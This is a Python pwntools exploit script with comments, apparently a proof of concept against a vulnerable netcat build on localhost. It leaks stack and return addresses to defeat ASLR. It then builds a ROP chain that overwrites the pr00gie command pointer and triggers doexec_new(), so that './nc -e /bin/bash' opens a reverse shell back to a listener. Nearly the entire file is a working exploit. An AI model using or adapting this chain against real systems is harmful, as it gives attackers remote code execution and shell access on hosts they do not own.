
from pwn import *

RHOST = "localhost"
RPORT = 1234
LHOST = "localhost"
LPORT = 31337

# open a listening port for the connect back
l = listen(LPORT)
# open a connection to the remote vulnerable nc
r = remote(RHOST, RPORT)

# send 0x50 bytes, triggering a leak of 0x50 bytes from the stack
r.sendline(b"A"*16 + p32(0)*4 + b"B"*0x30)
# conume and discard 0x40 of those bytes
data = r.read(0x40)
# the next 8 are a saved RBP value (stack pointer)
stackaddr = u64(r.read(8))
# the next 8 are the return address (.text pointer)
retaddr = u64(r.read(8))

# flush out the remaining data
data = r.recv(0x1000)
#print(hexdump(data))

# calculate the .text base address
baseaddr = retaddr - 0x587b
# calculate an address of our controlled data on the stack
stackstr = stackaddr - 0x1c8

print(f"Leaked return address: {retaddr:016x}")
print(f"Leaked stack address:  {stackaddr:016x}")
print(f"Base address:          {baseaddr:016x}")
print(f"CMD string address:    {stackstr:016x}")

# we will re-use doexec_new() to acheive code execution
DOEXEC_NEW = 0x5dda
# that function executes the command in the char*pr00gie global
PR00GIE_PTR = 0x90c8

# begin the chain with a ROP-nop, so we can break on this for testing
chain = b""
chain += p64(baseaddr + 0x201a) # ret nop

# build each byte from the stackstr in memory, one at a time with ROP
for i in range(0, 8):

	# if the byte is a 0x00, no need to change it, just skip
	b = u8(p64(stackstr)[i:i+1])
	if b == 0:
		continue

	# we use the gadget "add byte ptr [rsi + 0x39], ah; ret;" to build the pointer
	# this requires setting RSI and AH each time
	chain += p64(baseaddr + 0x42ed)					# pop rsi; ret;
	chain += p64((b) << 8)							# byte from SH_PTR
	chain += p64(baseaddr + 0x2b12)					# mov eax, esi; ret;
	chain += p64(baseaddr + 0x42ed)					# pop rsi; ret;
	chain += p64(baseaddr + PR00GIE_PTR - 0x39 + i)	# pr00gie ptr
	chain += p64(baseaddr + 0x5940)					# add byte ptr [rsi + 0x39], ah; ret;

# finally, call doexec_new() to trigger command execution
chain += p64(baseaddr + DOEXEC_NEW)

# construct and send final payload, which triggers the ROP chain
cmd = f"./nc -e /bin/bash {LHOST:s} {LPORT:d}\0".encode("ascii")
payload = b"A"*16 + p32(0)*4 + cmd + b"C"*(40-len(cmd)) + chain
r.sendline(payload)
r.close()

# we should now have a reverse shell!
l.interactive()
